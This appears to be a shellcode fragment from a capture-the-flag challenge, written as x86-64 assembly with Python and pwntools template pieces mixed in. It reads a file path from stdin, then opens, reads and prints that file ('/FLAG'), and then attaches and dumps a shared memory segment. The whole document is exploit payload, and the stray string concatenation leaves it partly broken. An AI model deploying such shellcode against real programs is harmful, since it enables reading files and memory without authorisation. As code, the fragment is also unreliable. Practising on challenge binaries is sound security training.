# read "/FLAG" from stdin
mov rax, 0
mov rdi, 0
mov rsi, hex(code_loc)
mov rdx, 6
syscall
# open("/FLAG"(code_loc), O_RDONLY)
mov rax, 2
mov rdi, hex(code_loc)
mov rsi, 0
syscall
# read(fd, code_loc + 0x6, 1000(0x400));
mov rdi, rax
mov rax, 0
mov rsi, " + hex(code_loc+0x6) + "
mov rdx, 0x400
syscall
# write(1, code_loc + 0x6, 1000(0x42))
mov rax, 1
mov rdi, 1
mov rsi," + hex(code_loc+0x6) +" 
mov rdx, 0x42
syscall

#shmget(0x1337, 0x1000, 0)
mov rdi, 0x1337
mov rsi, 0x1000
mov rdx, 0
mov rax, 0x1d
syscall

#shmat(rax, 0x1000, 0x1000)
mov rdi, rax
mov rsi, 0
mov rdx, 0x1000
mov rax, 0x1e
syscall

#write(1, rax, 0x1000)
# mov r10, rax
# mov rdi, 1
# mov rsi, rax
# shellcraft.amd64.strlen('rdx', 'rax') # mov rdx, 0x45
# mov rax, 1
# syscall
mov r10, rax
shellcraft.amd64.strlen('rax')
mov rdi, 1
mov rsi, r10
mov rdx, rcx
mov rax, 1
syscall


#exit(0)
mov rax, 60
mov rdi, 0
syscall

